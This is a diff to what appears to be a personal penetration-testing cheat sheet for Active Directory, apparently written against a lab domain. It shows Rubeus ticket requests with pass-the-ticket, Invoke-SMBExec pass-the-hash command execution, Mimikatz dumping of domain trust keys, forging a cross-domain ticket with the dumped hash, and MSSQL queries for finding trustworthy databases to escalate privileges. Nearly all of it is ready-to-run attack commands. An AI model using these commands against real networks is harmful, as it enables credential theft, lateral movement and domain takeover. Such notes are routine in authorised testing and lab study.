@@ -49,3 +49,23 @@ Rubeus.exe asktgt /user:Administrator /certificate:<path to .pfx file> /ptt /now
 ```powershell
 Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username Administrator -Hash <NTHASH> -Command <PATH TO EXE/ OR ANY COMMAND>
 ```
+
+## Path Domain trust with Mimikatz
+
+```powershell
+mimikatz.exe "lsadump::trust /path"
+
+## Get ticket with Rubeus with the hash obtained from above commands
+Rubeus.exe asktgt /user:mythical-us$ /domain:mythical-eu.vl /rc4:<HASH> /nowrap /ptt
+```
+
+## List trustworthy databases MSSQL
+
+```sql
+SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name = b.name;
+```
+
+## Check privilages on databses to see if we are owner of a trustworthy database
+```sql
+SELECT rp.name as database_role, mp.name as database_user FROM sys.database_role_members drm JOIN sys.database_principals rp on (drm.role_principal_id = rp.principal_id) JOIN sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+```
